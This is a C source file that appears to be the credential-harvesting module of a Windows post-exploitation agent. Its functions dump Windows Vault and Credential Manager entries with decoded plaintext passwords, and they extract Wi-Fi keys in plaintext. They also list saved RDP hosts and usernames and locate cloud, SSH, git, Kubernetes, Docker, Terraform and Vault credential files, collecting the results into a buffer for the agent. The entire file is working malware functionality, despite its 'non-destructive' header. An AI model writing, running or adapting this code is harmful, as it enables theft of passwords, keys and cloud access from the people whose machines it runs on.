/*
 * cred_harvest.c — Non-destructive credential discovery.
 *
 * Uses CredEnumerateW, wlanapi, and filesystem checks.
 * No LSASS access, no injection, no process spawning.
 */
#include "agent.h"
#include "cred_harvest.h"
#include <wincred.h>
#include <shlobj.h>

#pragma comment(lib, "advapi32.lib")

/* ─── Helpers ─── */

static int _append(unsigned char *buf, DWORD bufSize, DWORD *off, const char *fmt, ...) {
    if (!buf || !off || *off >= bufSize) return 0;
    va_list args;
    va_start(args, fmt);
    int w = _vsnprintf((char *)buf + *off, bufSize - *off, fmt, args);
    va_end(args);
    if (w > 0) *off += w;
    return w > 0 ? w : 0;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Vault API (vaultcli.dll) — dynamic load
 * ═══════════════════════════════════════════════════════════════════ */

/* Vault structures (not in standard headers) */
typedef struct _VAULT_ITEM_ELEMENT {
    DWORD SchemaElementId;
    DWORD Type;
    /* Union follows — we only care about string type */
} VAULT_ITEM_ELEMENT;

typedef struct _VAULT_ITEM {
    GUID SchemaId;
    PWSTR pszCredentialFriendlyName;
    VAULT_ITEM_ELEMENT *pResourceElement;
    VAULT_ITEM_ELEMENT *pIdentityElement;
    VAULT_ITEM_ELEMENT *pAuthenticatorElement;
    VAULT_ITEM_ELEMENT *pPackageSid;
    FILETIME LastModified;
    DWORD dwFlags;
    DWORD dwPropertiesCount;
    VAULT_ITEM_ELEMENT *pPropertyElements;
} VAULT_ITEM;

typedef DWORD (WINAPI *fn_VaultEnumerateVaults)(DWORD, DWORD *, GUID **);
typedef DWORD (WINAPI *fn_VaultOpenVault)(GUID *, DWORD, HANDLE *);
typedef DWORD (WINAPI *fn_VaultEnumerateItems)(HANDLE, DWORD, DWORD *, VAULT_ITEM **);
typedef DWORD (WINAPI *fn_VaultGetItem)(HANDLE, GUID *, VAULT_ITEM_ELEMENT *,
    VAULT_ITEM_ELEMENT *, VAULT_ITEM_ELEMENT *, HWND, DWORD, VAULT_ITEM **);
typedef DWORD (WINAPI *fn_VaultCloseVault)(HANDLE *);
typedef DWORD (WINAPI *fn_VaultFree)(void *);

int cred_dump_vault(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWritten) {
    if (!outBuf || !bytesWritten) return 0;
    *bytesWritten = 0;
    DWORD off = 0;
    int total = 0;

    _append(outBuf, outBufSize, &off, "=== Windows Vault ===\nVAULT\tRESOURCE\tIDENTITY\tLAST_MODIFIED\n");

    HMODULE hVault = LoadLibraryW(L"vaultcli.dll");
    if (!hVault) {
        _append(outBuf, outBufSize, &off, "(vaultcli.dll not available)\n");
        *bytesWritten = off;
        return 0;
    }

    fn_VaultEnumerateVaults pEnumVaults =
        (fn_VaultEnumerateVaults)GetProcAddress(hVault, "VaultEnumerateVaults");
    fn_VaultOpenVault pOpenVault =
        (fn_VaultOpenVault)GetProcAddress(hVault, "VaultOpenVault");
    fn_VaultEnumerateItems pEnumItems =
        (fn_VaultEnumerateItems)GetProcAddress(hVault, "VaultEnumerateItems");
    fn_VaultCloseVault pCloseVault =
        (fn_VaultCloseVault)GetProcAddress(hVault, "VaultCloseVault");
    fn_VaultFree pFree =
        (fn_VaultFree)GetProcAddress(hVault, "VaultFree");

    if (!pEnumVaults || !pOpenVault || !pEnumItems || !pCloseVault || !pFree) {
        FreeLibrary(hVault);
        _append(outBuf, outBufSize, &off, "(Vault API functions not found)\n");
        *bytesWritten = off;
        return 0;
    }

    DWORD vaultCount = 0;
    GUID *vaultGuids = NULL;
    if (pEnumVaults(0, &vaultCount, &vaultGuids) != 0 || vaultCount == 0) {
        FreeLibrary(hVault);
        _append(outBuf, outBufSize, &off, "(No vaults found)\n");
        *bytesWritten = off;
        return 0;
    }

    for (DWORD v = 0; v < vaultCount; v++) {
        HANDLE hVaultHandle = NULL;
        if (pOpenVault(&vaultGuids[v], 0, &hVaultHandle) != 0)
            continue;

        DWORD itemCount = 0;
        VAULT_ITEM *items = NULL;
        if (pEnumItems(hVaultHandle, 0x200, &itemCount, &items) == 0 && items) {
            for (DWORD i = 0; i < itemCount; i++) {
                char resource[512] = "(unknown)", identity[256] = "(unknown)";

                /* Extract resource name (element type 1 = string) */
                if (items[i].pResourceElement) {
                    /* The string pointer is at offset 16 in the element struct */
                    PWSTR *pStr = (PWSTR *)((BYTE *)items[i].pResourceElement + 16);
                    if (*pStr) {
                        WideCharToMultiByte(CP_UTF8, 0, *pStr, -1,
                                             resource, sizeof(resource), NULL, NULL);
                    }
                }

                /* Extract identity */
                if (items[i].pIdentityElement) {
                    PWSTR *pStr = (PWSTR *)((BYTE *)items[i].pIdentityElement + 16);
                    if (*pStr) {
                        WideCharToMultiByte(CP_UTF8, 0, *pStr, -1,
                                             identity, sizeof(identity), NULL, NULL);
                    }
                }

                /* Convert FILETIME to readable */
                SYSTEMTIME st;
                FileTimeToSystemTime(&items[i].LastModified, &st);
                char timeStr[32];
                _snprintf(timeStr, sizeof(timeStr), "%04d-%02d-%02d %02d:%02d",
                          st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

                char vaultName[64];
                _snprintf(vaultName, sizeof(vaultName),
                          "{%08x-...}", vaultGuids[v].Data1);

                _append(outBuf, outBufSize, &off, "%s\t%s\t%s\t%s\n",
                        vaultName, resource, identity, timeStr);
                total++;
            }
        }

        pCloseVault(&hVaultHandle);
    }

    pFree(vaultGuids);
    FreeLibrary(hVault);
    *bytesWritten = off;
    return total;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Credential Manager (CredEnumerateW)
 * ═══════════════════════════════════════════════════════════════════ */

int cred_dump_credman(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWritten) {
    if (!outBuf || !bytesWritten) return 0;
    *bytesWritten = 0;
    DWORD off = 0;
    int total = 0;

    _append(outBuf, outBufSize, &off,
            "=== Credential Manager ===\nTARGET\tUSERNAME\tTYPE\tPASSWORD\tLAST_WRITTEN\n");

    DWORD count = 0;
    PCREDENTIALW *creds = NULL;

    if (!CredEnumerateW(NULL, 0, &count, &creds) || count == 0) {
        _append(outBuf, outBufSize, &off, "(No credentials found or access denied)\n");
        *bytesWritten = off;
        return 0;
    }

    for (DWORD i = 0; i < count; i++) {
        PCREDENTIALW c = creds[i];

        char target[512] = {0}, user[256] = {0};
        if (c->TargetName)
            WideCharToMultiByte(CP_UTF8, 0, c->TargetName, -1,
                                 target, sizeof(target), NULL, NULL);
        if (c->UserName)
            WideCharToMultiByte(CP_UTF8, 0, c->UserName, -1,
                                 user, sizeof(user), NULL, NULL);

        const char *type = "OTHER";
        switch (c->Type) {
            case CRED_TYPE_GENERIC:                type = "GENERIC"; break;
            case CRED_TYPE_DOMAIN_PASSWORD:         type = "DOMAIN_PASSWORD"; break;
            case CRED_TYPE_DOMAIN_CERTIFICATE:      type = "DOMAIN_CERT"; break;
            case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: type = "VISIBLE_PASSWORD"; break;
        }

        /* Try to read password */
        char password[512] = "(not readable)";
        if (c->CredentialBlobSize > 0 && c->CredentialBlob) {
            /* Generic creds often have readable passwords */
            if (c->Type == CRED_TYPE_GENERIC ||
                c->Type == CRED_TYPE_DOMAIN_VISIBLE_PASSWORD)
            {
                int passLen = WideCharToMultiByte(CP_UTF8, 0,
                    (LPCWSTR)c->CredentialBlob,
                    c->CredentialBlobSize / sizeof(wchar_t),
                    password, sizeof(password) - 1, NULL, NULL);
                if (passLen <= 0) {
                    /* Might be raw bytes, hex-encode first 32 bytes */
                    int hexLen = c->CredentialBlobSize > 32 ? 32 : c->CredentialBlobSize;
                    char *p = password;
                    for (int b = 0; b < hexLen; b++)
                        p += _snprintf(p, 4, "%02x", c->CredentialBlob[b]);
                    *p = '\0';
                }
            } else {
                _snprintf(password, sizeof(password), "(%u bytes, encrypted)",
                          c->CredentialBlobSize);
            }
        }

        /* Last written */
        SYSTEMTIME st;
        FileTimeToSystemTime(&c->LastWritten, &st);
        char timeStr[32];
        _snprintf(timeStr, sizeof(timeStr), "%04d-%02d-%02d %02d:%02d",
                  st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

        _append(outBuf, outBufSize, &off, "%s\t%s\t%s\t%s\t%s\n",
                target, user, type, password, timeStr);
        total++;
    }

    CredFree(creds);
    *bytesWritten = off;
    return total;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Wi-Fi profiles (wlanapi.dll)
 * ═══════════════════════════════════════════════════════════════════ */

/* wlanapi types (dynamic load to avoid hard dependency) */
typedef struct _WLAN_INTERFACE_INFO {
    GUID InterfaceGuid;
    WCHAR strInterfaceDescription[256];
    DWORD isState;
} WLAN_INTERFACE_INFO;

typedef struct _WLAN_INTERFACE_INFO_LIST {
    DWORD dwNumberOfItems;
    DWORD dwIndex;
    WLAN_INTERFACE_INFO InterfaceInfo[1];
} WLAN_INTERFACE_INFO_LIST;

typedef struct _WLAN_PROFILE_INFO {
    WCHAR strProfileName[256];
    DWORD dwFlags;
} WLAN_PROFILE_INFO;

typedef struct _WLAN_PROFILE_INFO_LIST {
    DWORD dwNumberOfItems;
    DWORD dwIndex;
    WLAN_PROFILE_INFO ProfileInfo[1];
} WLAN_PROFILE_INFO_LIST;

typedef DWORD (WINAPI *fn_WlanOpenHandle)(DWORD, void *, DWORD *, HANDLE *);
typedef DWORD (WINAPI *fn_WlanCloseHandle)(HANDLE, void *);
typedef DWORD (WINAPI *fn_WlanEnumInterfaces)(HANDLE, void *, WLAN_INTERFACE_INFO_LIST **);
typedef DWORD (WINAPI *fn_WlanGetProfileList)(HANDLE, const GUID *, void *, WLAN_PROFILE_INFO_LIST **);
typedef DWORD (WINAPI *fn_WlanGetProfile)(HANDLE, const GUID *, LPCWSTR, void *, LPWSTR *, DWORD *, DWORD *);
typedef void  (WINAPI *fn_WlanFreeMemory)(void *);

int cred_dump_wifi(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWritten) {
    if (!outBuf || !bytesWritten) return 0;
    *bytesWritten = 0;
    DWORD off = 0;
    int total = 0;

    _append(outBuf, outBufSize, &off, "=== Wi-Fi Profiles ===\nSSID\tAUTH\tENCRYPTION\tPASSWORD\n");

    HMODULE hWlan = LoadLibraryW(L"wlanapi.dll");
    if (!hWlan) {
        _append(outBuf, outBufSize, &off, "(wlanapi.dll not available — no Wi-Fi)\n");
        *bytesWritten = off;
        return 0;
    }

    fn_WlanOpenHandle pOpen = (fn_WlanOpenHandle)GetProcAddress(hWlan, "WlanOpenHandle");
    fn_WlanCloseHandle pClose = (fn_WlanCloseHandle)GetProcAddress(hWlan, "WlanCloseHandle");
    fn_WlanEnumInterfaces pEnumIf = (fn_WlanEnumInterfaces)GetProcAddress(hWlan, "WlanEnumInterfaces");
    fn_WlanGetProfileList pGetList = (fn_WlanGetProfileList)GetProcAddress(hWlan, "WlanGetProfileList");
    fn_WlanGetProfile pGetProfile = (fn_WlanGetProfile)GetProcAddress(hWlan, "WlanGetProfile");
    fn_WlanFreeMemory pFreeMem = (fn_WlanFreeMemory)GetProcAddress(hWlan, "WlanFreeMemory");

    if (!pOpen || !pClose || !pEnumIf || !pGetList || !pGetProfile || !pFreeMem) {
        FreeLibrary(hWlan);
        _append(outBuf, outBufSize, &off, "(WLAN API functions not found)\n");
        *bytesWritten = off;
        return 0;
    }

    HANDLE hClient = NULL;
    DWORD negotiatedVer;
    if (pOpen(2, NULL, &negotiatedVer, &hClient) != ERROR_SUCCESS) {
        FreeLibrary(hWlan);
        _append(outBuf, outBufSize, &off, "(WlanOpenHandle failed)\n");
        *bytesWritten = off;
        return 0;
    }

    WLAN_INTERFACE_INFO_LIST *ifList = NULL;
    if (pEnumIf(hClient, NULL, &ifList) != ERROR_SUCCESS || !ifList) {
        pClose(hClient, NULL);
        FreeLibrary(hWlan);
        *bytesWritten = off;
        return 0;
    }

    for (DWORD i = 0; i < ifList->dwNumberOfItems; i++) {
        WLAN_PROFILE_INFO_LIST *profList = NULL;
        if (pGetList(hClient, &ifList->InterfaceInfo[i].InterfaceGuid,
                      NULL, &profList) != ERROR_SUCCESS || !profList)
            continue;

        for (DWORD p = 0; p < profList->dwNumberOfItems; p++) {
            LPWSTR xml = NULL;
            DWORD flags = 0x04;  /* WLAN_PROFILE_GET_PLAINTEXT_KEY */
            DWORD grantedAccess = 0;

            if (pGetProfile(hClient, &ifList->InterfaceInfo[i].InterfaceGuid,
                             profList->ProfileInfo[p].strProfileName,
                             NULL, &xml, &flags, &grantedAccess) == ERROR_SUCCESS && xml)
            {
                char ssid[256] = {0};
                WideCharToMultiByte(CP_UTF8, 0,
                    profList->ProfileInfo[p].strProfileName, -1,
                    ssid, sizeof(ssid), NULL, NULL);

                /* Parse XML for auth, encryption, key */
                char xmlA[8192] = {0};
                WideCharToMultiByte(CP_UTF8, 0, xml, -1, xmlA, sizeof(xmlA), NULL, NULL);

                /* Simple XML tag extraction */
                char auth[64] = "open", enc[64] = "none", key[256] = "(none)";

                char *pAuth = strstr(xmlA, "<authentication>");
                if (pAuth) {
                    pAuth += 16;
                    char *pEnd = strstr(pAuth, "</authentication>");
                    if (pEnd && (pEnd - pAuth) < 64) {
                        int len = (int)(pEnd - pAuth);
                        strncpy(auth, pAuth, len);
                        auth[len] = '\0';
                    }
                }

                char *pEnc = strstr(xmlA, "<encryption>");
                if (pEnc) {
                    pEnc += 12;
                    char *pEnd = strstr(pEnc, "</encryption>");
                    if (pEnd && (pEnd - pEnc) < 64) {
                        int len = (int)(pEnd - pEnc);
                        strncpy(enc, pEnc, len);
                        enc[len] = '\0';
                    }
                }

                char *pKey = strstr(xmlA, "<keyMaterial>");
                if (pKey) {
                    pKey += 13;
                    char *pEnd = strstr(pKey, "</keyMaterial>");
                    if (pEnd && (pEnd - pKey) < 256) {
                        int len = (int)(pEnd - pKey);
                        strncpy(key, pKey, len);
                        key[len] = '\0';
                    }
                }

                _append(outBuf, outBufSize, &off, "%s\t%s\t%s\t%s\n",
                        ssid, auth, enc, key);
                total++;

                pFreeMem(xml);
            }
        }
        pFreeMem(profList);
    }

    pFreeMem(ifList);
    pClose(hClient, NULL);
    FreeLibrary(hWlan);
    *bytesWritten = off;
    return total;
}

/* ═══════════════════════════════════════════════════════════════════
 *  RDP saved connections
 * ═══════════════════════════════════════════════════════════════════ */

int cred_dump_rdp_history(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWritten) {
    if (!outBuf || !bytesWritten) return 0;
    *bytesWritten = 0;
    DWORD off = 0;
    int total = 0;

    _append(outBuf, outBufSize, &off, "=== RDP Connection History ===\nHOSTNAME\tUSERNAME_HINT\n");

    /* Enumerate saved RDP servers */
    HKEY hServers;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Terminal Server Client\\Servers",
        0, KEY_READ, &hServers) == ERROR_SUCCESS)
    {
        DWORD numSubs;
        RegQueryInfoKeyW(hServers, NULL, NULL, NULL, &numSubs,
                          NULL, NULL, NULL, NULL, NULL, NULL, NULL);

        for (DWORD i = 0; i < numSubs; i++) {
            wchar_t hostW[256] = {0};
            DWORD nameLen = 256;
            if (RegEnumKeyExW(hServers, i, hostW, &nameLen,
                               NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
                continue;

            char host[256];
            WideCharToMultiByte(CP_UTF8, 0, hostW, -1, host, sizeof(host), NULL, NULL);

            /* Try to read UsernameHint */
            wchar_t subKey[512];
            _snwprintf(subKey, 512,
                L"Software\\Microsoft\\Terminal Server Client\\Servers\\%s", hostW);

            HKEY hHost;
            char user[256] = "(none)";
            if (RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hHost) == ERROR_SUCCESS) {
                wchar_t userW[256] = {0};
                DWORD sz = sizeof(userW) - 2;
                DWORD type;
                if (RegQueryValueExW(hHost, L"UsernameHint", NULL, &type,
                                      (LPBYTE)userW, &sz) == ERROR_SUCCESS && type == REG_SZ)
                {
                    WideCharToMultiByte(CP_UTF8, 0, userW, -1, user, sizeof(user), NULL, NULL);
                }
                RegCloseKey(hHost);
            }

            _append(outBuf, outBufSize, &off, "%s\t%s\n", host, user);
            total++;
        }
        RegCloseKey(hServers);
    }

    /* Also check MRU (most recently used) connections */
    HKEY hMRU;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Terminal Server Client\\Default",
        0, KEY_READ, &hMRU) == ERROR_SUCCESS)
    {
        for (int m = 0; m < 20; m++) {
            wchar_t mruName[16];
            _snwprintf(mruName, 16, L"MRU%d", m);

            wchar_t mruVal[256] = {0};
            DWORD sz = sizeof(mruVal) - 2;
            DWORD type;
            if (RegQueryValueExW(hMRU, mruName, NULL, &type,
                                  (LPBYTE)mruVal, &sz) == ERROR_SUCCESS && type == REG_SZ)
            {
                char val[256];
                WideCharToMultiByte(CP_UTF8, 0, mruVal, -1, val, sizeof(val), NULL, NULL);
                _append(outBuf, outBufSize, &off, "%s\t(MRU entry)\n", val);
            } else {
                break;
            }
        }
        RegCloseKey(hMRU);
    }

    *bytesWritten = off;
    return total;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Cloud credential file discovery
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL _check_file(const char *path, unsigned char *buf, DWORD bufSize,
                        DWORD *off, int *total)
{
    DWORD attrs = GetFileAttributesA(path);
    if (attrs == INVALID_FILE_ATTRIBUTES) return FALSE;

    /* Get file size */
    HANDLE hFile = CreateFileA(path, 0, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, 0, NULL);
    DWORD fileSize = 0;
    if (hFile != INVALID_HANDLE_VALUE) {
        fileSize = GetFileSize(hFile, NULL);
        CloseHandle(hFile);
    }

    _append(buf, bufSize, off, "%s\t%u bytes\n", path, fileSize);
    (*total)++;
    return TRUE;
}

int cred_find_cloud_creds(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWritten) {
    if (!outBuf || !bytesWritten) return 0;
    *bytesWritten = 0;
    DWORD off = 0;
    int total = 0;

    _append(outBuf, outBufSize, &off,
            "=== Cloud Credential Files ===\nPATH\tSIZE\n");

    /* Get user profile path */
    char userProfile[MAX_PATH] = {0};
    char appData[MAX_PATH] = {0};

    ExpandEnvironmentStringsA("%USERPROFILE%", userProfile, MAX_PATH);
    ExpandEnvironmentStringsA("%APPDATA%", appData, MAX_PATH);

    /* AWS */
    char path[MAX_PATH];
    _snprintf(path, MAX_PATH, "%s\\.aws\\credentials", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    _snprintf(path, MAX_PATH, "%s\\.aws\\config", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    /* Azure */
    _snprintf(path, MAX_PATH, "%s\\.azure\\accessTokens.json", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    _snprintf(path, MAX_PATH, "%s\\.azure\\azureProfile.json", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    /* GCP */
    _snprintf(path, MAX_PATH, "%s\\gcloud\\credentials.db", appData);
    _check_file(path, outBuf, outBufSize, &off, &total);

    _snprintf(path, MAX_PATH, "%s\\gcloud\\access_tokens.db", appData);
    _check_file(path, outBuf, outBufSize, &off, &total);

    _snprintf(path, MAX_PATH, "%s\\.config\\gcloud\\credentials.db", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    /* Kubernetes */
    _snprintf(path, MAX_PATH, "%s\\.kube\\config", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    /* Docker */
    _snprintf(path, MAX_PATH, "%s\\.docker\\config.json", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    /* SSH keys */
    _snprintf(path, MAX_PATH, "%s\\.ssh\\id_rsa", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    _snprintf(path, MAX_PATH, "%s\\.ssh\\id_ed25519", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    _snprintf(path, MAX_PATH, "%s\\.ssh\\id_ecdsa", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    /* GitHub/GitLab tokens */
    _snprintf(path, MAX_PATH, "%s\\.gitcredentials", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    _snprintf(path, MAX_PATH, "%s\\.git-credentials", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    /* Terraform */
    _snprintf(path, MAX_PATH, "%s\\.terraformrc", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    _snprintf(path, MAX_PATH, "%s\\terraform.d\\credentials.tfrc.json", appData);
    _check_file(path, outBuf, outBufSize, &off, &total);

    /* Vault (HashiCorp) */
    _snprintf(path, MAX_PATH, "%s\\.vault-token", userProfile);
    _check_file(path, outBuf, outBufSize, &off, &total);

    if (total == 0)
        _append(outBuf, outBufSize, &off, "(No cloud credential files found)\n");

    *bytesWritten = off;
    return total;
}
